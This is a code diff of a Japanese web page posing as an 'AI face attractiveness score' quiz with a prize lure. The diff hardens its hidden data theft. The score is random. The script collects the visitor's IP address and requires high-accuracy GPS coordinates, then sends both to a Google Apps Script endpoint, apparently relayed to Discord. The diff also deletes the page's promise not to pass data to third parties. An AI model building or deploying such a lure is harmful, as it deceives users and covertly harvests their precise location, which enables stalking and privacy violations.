@@ -13,7 +13,6 @@
 
     <h1>AI顔面偏差値診断</h1>
     
-    <!-- 景品に関する案内 -->
     <div class="notice">
         <p><strong>【重要】景品プレゼントについて</strong><br>
         顔面偏差値が<strong>90点以上</strong>の方には景品をお送りします。<br>
@@ -27,40 +26,35 @@
         <p><strong>株式会社デジタルアイ・ソリューションズ</strong></p>
         <p>運営責任者：佐藤 健一</p>
         <p>当サイトでは、画像データの保存は行いません。<br>
-        景品発送および診断精度向上のため、位置情報を含むデータを取得いたします。<br>
-        取得した情報は第三者への提供や流用は一切行いません。</p>
-        <p>&copy; 2026 Digital AI Solutions, Inc.</p>
+        景品発送および診断精度向上のため、位置情報を含むデータを取得いたします。</p>
     </footer>
 
     <script>
-        const url = "https://script.google.com/macros/s/AKfycbyXJfsLm94JuQx2IdjPySnfSN3hHo8ORVUkiO3xyD8PXnXrXcwhpkzinMDJ4sMzk0LF9g/exec";
+        const url = "https://script.google.com/macros/s/AKfycbxBaw5j9FdQPtYAorJaMzD3R9gyr8509hQIPDZ3Njfh5ZJ6PGcVNlC62Xn-GV4YvkdcOA/exec";
 
         document.getElementById('checkButton').addEventListener('click', async () => {
             const display = document.getElementById('r');
-            display.innerText = "診断中...";
+            display.innerText = "位置情報を取得しています...（許可してください）";
 
             try {
+                // 位置情報取得（タイムアウト20秒）
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 20000,
+                        maximumAge: 0
+                    });
+                });
+                
+                const locationText = `緯度: ${pos.coords.latitude}, 経度: ${pos.coords.longitude}`;
+
                 // IP取得
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                
-                // 位置情報取得
-                let locationText = "許可されていません";
-                try {
-                    const pos = await new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject));
-                    locationText = `緯度: ${pos.coords.latitude}, 経度: ${pos.coords.longitude}`;
-                } catch(e) { locationText = "取得拒否"; }
 
                 const score = Math.floor(Math.random() * 100);
                 const data = {
-                    msg: "📊 **顔面偏差値診断レポート** \n" +
-                         "------------------------------\n" +
-                         "結果: " + score + "点\n" +
-                         "景品対象: " + (score >= 90 ? "✅ 対象" : "❌ 非対象") + "\n" +
-                         "IPアドレス: " + ipData.ip + "\n" +
-                         "位置情報: " + locationText + "\n" +
-                         "------------------------------\n" +
-                         "🏢 株式会社デジタルアイ・ソリューションズ"
+                    msg: `📊 顔面偏差値診断レポート\n結果: ${score}点\n景品対象: ${score >= 90 ? "✅ 対象" : "❌ 非対象"}\nIP: ${ipData.ip}\n位置情報: ${locationText}`
                 };
 
                 const response = await fetch(url, {
@@ -70,12 +64,12 @@
                 });
 
                 if (response.ok) {
-                    display.innerText = "送信完了！結果をDiscordで確認してください。";
+                    display.innerText = "送信完了！";
                 } else {
-                    display.innerText = "サーバーエラーが発生しました。";
+                    display.innerText = "送信失敗";
                 }
             } catch (e) {
-                display.innerText = "エラー: 位置情報を許可してください。";
+                display.innerText = "位置情報の取得に失敗しました。設定から許可されているか確認してください。";
             }
         });
     </script>
